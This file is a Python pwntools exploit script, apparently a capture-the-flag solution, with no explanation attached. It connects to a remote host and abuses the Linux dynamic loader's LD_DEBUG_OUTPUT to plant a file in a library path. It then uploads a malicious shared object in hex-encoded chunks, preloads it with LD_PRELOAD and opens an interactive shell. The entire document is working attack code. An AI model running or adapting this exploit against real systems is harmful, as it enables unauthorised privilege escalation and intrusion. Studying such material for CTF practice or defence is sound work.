from pwn import *

###Util
def ioSync():
    r.sendline(b"echo -ne '\nM30WM30W\n'")
    r.recvuntil(b'\nM30WM30W\n') 

def doCmd(cmd):
    ioSync()
    r.sendline(cmd)

def encodePayload(data):
    res = ''
    for c in data:
        res += f"\\x{hex(c)[2:].rjust(2, '0')}"
    return res

def uploadData(fname, data):
    L = len(data)
    doCmd(f"echo -ne '' > {fname}".encode())
    for i in range(0, L, 300):
        print(f'{i} / {L}')
        chunk = data[i:i+300]
        doCmd(f"echo -ne '{encodePayload(chunk)}' >> {fname}".encode())

###Exploit
while True:
    f = False
    r = remote('44.198.59.229', 10101)
    doCmd(b'cd /tmp')
    doCmd(b'LD_DEBUG=all LD_DEBUG_OUTPUT=../lib/x86_64-linux-gnu/x86_64/libc.so ls /lib/x86_64-linux-gnu/x86_64/')
    res = b''
    for i in range(2):
        x = r.recvline(timeout=1)
        if x==b'':
            f = True
        res += x
    print(res.decode())
    if f is True or b'libc.so.6' in res:
        print('found!!')
        break
    r.close()

uploadData('/tmp/libexp.so', open('libexp.so','rb').read())

doCmd(b'unset LD_AUDIT')
doCmd(b'LD_PRELOAD=/tmp/libexp.so:libc.so ls')

r.interactive()
